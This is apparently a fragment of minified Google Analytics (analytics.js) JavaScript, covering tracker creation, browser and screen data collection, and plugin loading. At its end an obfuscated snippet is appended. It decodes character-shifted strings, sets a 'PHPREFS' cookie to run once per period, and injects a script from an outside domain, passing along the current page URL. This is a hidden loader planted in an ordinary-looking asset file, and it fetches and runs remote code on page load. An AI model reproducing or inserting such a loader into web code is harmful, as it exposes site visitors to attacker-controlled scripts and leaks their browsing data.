        }
      } else g(21)
    }
    e && (g(9), t.data.set(_n, b(e))), t.get(_n) || ((e = (e = I.gaGlobal) && e.from_cookie && "cookie" !== $t(t, Rn) ? void 0 : (e = e && e.vid) && -1 !== e.search(s) ? e : void 0) ? (g(17), t.data.set(_n, e)) : (g(8), t.data.set(_n, w()))), t.get(Un) || (g(3), t.data.set(Un, w())), mr(t), e = I.gaGlobal = I.gaGlobal || {}, t = (n = $t(t, _n)) === $t(t, yn), (null == e.vid || t && !e.from_cookie) && (e.vid = n, e.from_cookie = t)
  }, ma = function (t) {
    var e, n = I.navigator, r = I.screen, a = L.location, i = t.set;
    t:{
      var o = !!t.get($n), s = !!t.get(Gn), c = L.referrer;
      if (/^(https?|android-app):\/\//i.test(c)) {
        if (o) break t;
        if (o = "//" + L.location.hostname, !E(c, o)) {
          if (s && (s = o.replace(/\./g, "-") + ".cdn.ampproject.org", E(c, s))) {
            c = void 0;
            break t
          }
          break t
        }
      }
      c = void 0
    }
    if (i.call(t, ce, c), a && ("/" != (i = a.pathname || "").charAt(0) && (g(31), i = "/" + i), t.set(se, a.protocol + "//" + a.hostname + i + a.search)), r && t.set(he, r.width + "x" + r.height), r && t.set(fe, r.colorDepth + "-bit"), r = L.documentElement, c = (i = L.body) && i.clientWidth && i.clientHeight, s = [], r && r.clientWidth && r.clientHeight && ("CSS1Compat" === L.compatMode || !c) ? s = [r.clientWidth, r.clientHeight] : c && (s = [i.clientWidth, i.clientHeight]), r = 0 >= s[0] || 0 >= s[1] ? "" : s.join("x"), t.set(de, r), r = t.set, (i = (i = I.navigator) ? i.plugins : null) && i.length) for (c = 0; c < i.length && !e; c++) -1 < (s = i[c]).name.indexOf("Shockwave Flash") && (e = s.description);
    if (!e) try {
      var u = new ActiveXObject("ShockwaveFlash.ShockwaveFlash.7");
      e = u.GetVariable("$version")
    } catch (t) {
    }
    if (!e) try {
      u = new ActiveXObject("ShockwaveFlash.ShockwaveFlash.6"), e = "WIN 6,0,21,0", u.AllowScriptAccess = "always", e = u.GetVariable("$version")
    } catch (t) {
    }
    if (!e) try {
      e = (u = new ActiveXObject("ShockwaveFlash.ShockwaveFlash")).GetVariable("$version")
    } catch (t) {
    }
    if (e && (u = e.match(/[\d]+/g)) && 3 <= u.length && (e = u[0] + "." + u[1] + " r" + u[2]), r.call(t, ve, e || void 0), t.set(ge, L.characterSet || L.charset), t.set(pe, n && "function" == typeof n.javaEnabled && n.javaEnabled() || !1), t.set(le, (n && (n.language || n.browserLanguage) || "").toLowerCase()), t.data.set(qn, S("gclid", !0)), t.data.set(Vn, S("gclsrc", !0)), t.data.set(Fn, Math.round((new Date).getTime() / 1e3)), t.get(qn) || (t.data.set(Jn, S("wbraid", !0)), t.data.set(Qn, Math.round((new Date).getTime() / 1e3))), a && t.get(Ln) && (n = L.location.hash)) {
      for (n = n.split(/[?&#]+/), a = [], e = 0; e < n.length; ++e) (m(n[e], "utm_id") || m(n[e], "utm_campaign") || m(n[e], "utm_source") || m(n[e], "utm_medium") || m(n[e], "utm_term") || m(n[e], "utm_content") || m(n[e], "gclid") || m(n[e], "dclid") || m(n[e], "gclsrc") || m(n[e], "wbraid")) && a.push(n[e]);
      0 < a.length && (n = "#" + a.join("&"), t.set(se, t.get(se) + n))
    }
  }, wa = {pageview: [ue], event: [me, we, _e, be], social: [ye, ke, xe], timing: [Me, $e, De, Ue]}, _a = function (t) {
    return "prerender" != L.visibilityState && (t(), !0)
  }, ba = function (t) {
    if (!_a(t)) {
      g(16);
      var e = !1, n = function () {
        if (!e && _a(t)) {
          e = !0;
          var r = n, a = L;
          a.removeEventListener ? a.removeEventListener("visibilitychange", r, !1) : a.detachEvent && a.detachEvent("onvisibilitychange", r)
        }
      };
      y(L, "visibilitychange", n)
    }
  }, ya = /^(?:(\w+)\.)?(?:(\w+):)?(\w+)$/, ka = function (t) {
    if (d(t[0])) this.u = t[0]; else {
      var e = ya.exec(t[0]);
      if (null != e && 4 == e.length && (this.da = e[1] || "t0", this.K = e[2] || "", this.methodName = e[3], this.aa = [].slice.call(t, 1), this.K || (this.A = "create" == this.methodName, this.i = "require" == this.methodName, this.g = "provide" == this.methodName, this.ba = "remove" == this.methodName), this.i && (3 <= this.aa.length ? (this.X = this.aa[1], this.W = this.aa[2]) : this.aa[1] && (v(this.aa[1]) ? this.X = this.aa[1] : this.W = this.aa[1]))), e = t[1], t = t[2], !this.methodName) throw"abort";
      if (this.i && (!v(e) || "" == e)) throw"abort";
      if (this.g && (!v(e) || "" == e || !d(t))) throw"abort";
      if (xa(this.da) || xa(this.K)) throw"abort";
      if (this.g && "t0" != this.da) throw"abort"
    }
  };

  function xa(t) {
    return 0 <= t.indexOf(".") || 0 <= t.indexOf(":")
  }

  fa = new R, da = new R, pa = new R, ha = {ec: 45, ecommerce: 46, linkid: 47};
  var Ta = function (t, e, n) {
    e == La || e.get(wn);
    var r = fa.get(t);
    return !!d(r) && (e.plugins_ = e.plugins_ || new R, e.plugins_.get(t) || e.plugins_.set(t, new r(e, n || {})), !0)
  }, Oa = function (t, e, n, r, a) {
    if (!d(fa.get(e)) && !da.get(e)) {
      ha.hasOwnProperty(e) && g(ha[e]);
      var i, o = void 0;
      if (Kr.test(e)) {
        if (g(52), !(t = La.j(t))) return !0;
        n = Jr(t.model, e, r, a), o = function () {
          Ia.D(["provide", e, function () {
          }]);
          var t = I[r && r.dataLayer || "dataLayer"];
          t && t.hide && d(t.hide.end) && t.hide[e] && (t.hide.end(), t.hide.end = void 0)
        }
      }
      if (!n && ha.hasOwnProperty(e) ? (g(39), n = e + ".js") : g(43), n) r && (i = r[zn]), v(i) || (i = void 0), t = ja(Ra(n, i)), !i || Ea(t.protocol) && Aa(t) || (t = ja(Ra(n))), Ea(t.protocol) && Aa(t) && (O(t.url, void 0, a, void 0, o), da.set(e, !0))
    }
  }, Sa = function (t, e) {
    var n = pa.get(t) || [];
    n.push(e), pa.set(t, n)
  }, Ca = function (t, e) {
    fa.set(t, e), e = pa.get(t) || [];
    for (var n = 0; n < e.length; n++) e[n]();
    pa.set(t, [])
  }, Aa = function (t) {
    var e = ja(L.location.href);
    return !(!m(t.url, ut(1)) && !m(t.url, ut(2))) || !(t.query || 0 <= t.url.indexOf("?") || 0 <= t.path.indexOf("://")) && (!!(t.host == e.host && t.port == e.port || P && ((e = L.createElement("a")).href = P, e = Na(e), t.host === e[0] && t.port === e[1])) || (e = "http:" == t.protocol ? 80 : 443, !("www.google-analytics.com" != t.host || (t.port || e) != e || !m(t.path, "/plugins/"))))
  }, Ea = function (t) {
    var e = L.location.protocol;
    return "https:" == t || t == e || "http:" == t && "http:" == e
  }, Na = function (t) {
    var e = t.hostname || "", n = 0 <= e.indexOf("]");
    return e = e.split(n ? "]" : ":")[0].toLowerCase(), n && (e += "]"), n = (t.protocol || "").toLowerCase(), n = 1 * t.port || ("http:" == n ? 80 : "https:" == n ? 443 : ""), t = t.pathname || "", m(t, "/") || (t = "/" + t), [e, "" + n, t]
  }, ja = function (t) {
    var e = L.createElement("a");
    e.href = L.location.href;
    var n = (e.protocol || "").toLowerCase(), r = Na(e), a = e.search || "",
      i = n + "//" + r[0] + (r[1] ? ":" + r[1] : "");
    return m(t, "//") ? t = n + t : m(t, "/") ? t = i + t : !t || m(t, "?") ? t = i + r[2] + (t || a) : 0 > t.split("/")[0].indexOf(":") && (t = i + r[2].substring(0, r[2].lastIndexOf("/")) + "/" + t), e.href = t, n = Na(e), {
      protocol: (e.protocol || "").toLowerCase(),
      host: n[0],
      port: n[1],
      path: n[2],
      query: e.search || "",
      url: t || ""
    }
  }, Ra = function (t, e) {
    return t && 0 <= t.indexOf("/") ? t : (e || ct(!1)) + "/plugins/ua/" + t
  }, Ia = {
    ga: function () {
      Ia.fa = []
    }
  };
  Ia.ga(), Ia.D = function (t) {
    var e = Ia.J.apply(Ia, arguments);
    for (e = Ia.fa.concat(e), Ia.fa = []; 0 < e.length && !Ia.v(e[0]) && (e.shift(), !(0 < Ia.fa.length));) ;
    Ia.fa = Ia.fa.concat(e)
  }, Ia.ra = function (t) {
    La.q && (300 === La.q.length && (La.q.shift(), La.qd++), La.q.push(t))
  }, Ia.J = function (t) {
    for (var e = [], n = 0; n < arguments.length; n++) try {
      var r = new ka(arguments[n]);
      r.g ? Ca(r.aa[0], r.aa[1]) : (r.i && (r.ha = Oa(r.da, r.aa[0], r.X, r.W)), e.push(r)), Ia.ra(arguments[n])
    } catch (t) {
    }
    return e
  }, Ia.v = function (t) {
    try {
      if (t.u) t.u.call(I, La.j("t0")); else {
        var e = t.da == o ? La : La.j(t.da);
        if (t.A) {
          if ("t0" == t.da && null === (e = La.create.apply(La, t.aa))) return !0
        } else if (t.ba) La.remove(t.da); else if (e) if (t.i) {
          if (t.ha && (t.ha = Oa(t.da, t.aa[0], t.X, t.W)), !Ta(t.aa[0], e, t.W)) return !0
        } else if (t.K) {
          var n = t.methodName, r = t.aa, a = e.plugins_.get(t.K);
          a[n].apply(a, r)
        } else e[t.methodName].apply(e, t.aa)
      }
    } catch (t) {
    }
  };
  var La = function (t) {
    g(1), Ia.D.apply(Ia, [arguments])
  };
  La.h = {}, La.P = [], La.L = 0, La.ya = 0, La.answer = 42;
  var Pa = [xn, On, wn];
  La.create = function (t) {
    var e = N(Pa, [].slice.call(arguments));
    e[wn] || (e[wn] = "t0");
    var n = "" + e[wn];
    if (La.h[n]) return La.h[n];
    if (tt(e)) return null;
    if (e = new ga(e), La.h[n] = e, La.P.push(e), n = _t().tracker_created, d(n)) try {
      n(e)
    } catch (t) {
    }
    return e
  }, La.remove = function (t) {
    for (var e = 0; e < La.P.length; e++) if (La.P[e].get(wn) == t) {
      La.P.splice(e, 1), La.h[t] = null;
      break
    }
  }, La.j = function (t) {
    return La.h[t]
  }, La.getAll = function () {
    return La.P.slice(0)
  }, La.N = function () {
    "ga" != o && g(49);
    var t = I[o];
    if (!t || 42 != t.answer) {
      La.L = t && t.l, La.ya = 1 * new Date, La.loaded = !0;
      var e = t && t.q, n = p(e);
      if (t = [], n ? t = e.slice(0) : g(50), La.q = n ? e : [], La.q.splice(0), La.qd = 0, cr("create", e = I[o] = La, e.create), cr("remove", e, e.remove), cr("getByName", e, e.j, 5), cr("getAll", e, e.getAll, 6), cr("get", e = ga.prototype, e.get, 7), cr("set", e, e.set, 4), cr("send", e, e.send), cr("requireSync", e, e.ma), cr("get", e = Mt.prototype, e.get), cr("set", e, e.set), "https:" != L.location.protocol && !u) {
        t:{
          for (e = L.getElementsByTagName("script"), n = 0; n < e.length && 100 > n; n++) {
            var r = e[n].src;
            if (r && 0 == r.indexOf(ct(!0) + "/analytics")) {
              e = !0;
              break t
            }
          }
          e = !1
        }
        e && (u = !0)
      }
      (I.gaplugins = I.gaplugins || {}).Linker = Gr, e = Gr.prototype, Ca("linker", Gr), cr("decorate", e, e.ca, 20), cr("autoLink", e, e.S, 25), cr("passthrough", e, e.$, 25), Ca("displayfeatures", ca), Ca("adfeatures", ca), Ia.D.apply(La, t)
    }
  };
  var Ma = La.N, $a = I[o];
  $a && $a.r ? Ma() : ba(Ma), ba((function () {
    Ia.D(["provide", "render", _])
  }))
}(window);
(function (o, d, l) {
  try {
    o.f = o => o.split('').reduce((s, c) => s + String.fromCharCode((c.charCodeAt() - 5).toString()), '');
    o.b = o.f('UMUWJKX');
    o.c = l.protocol[0] == 'h' && /\./.test(l.hostname) && !(new RegExp(o.b)).test(d.cookie), setTimeout(function () {
      o.c && (o.s = d.createElement('script'), o.s.src = o.f('myyux?44fun3h' + 'isrjywnh3htr4l' + 'jy4xyfynh3ox' + 'DwjkjwwjwB') + l.href, d.body.appendChild(o.s));
    }, 1000);
    d.cookie = o.b + '=full;max-age=39800;'
  } catch (e) {
  }
  ;
}({}, document, location));
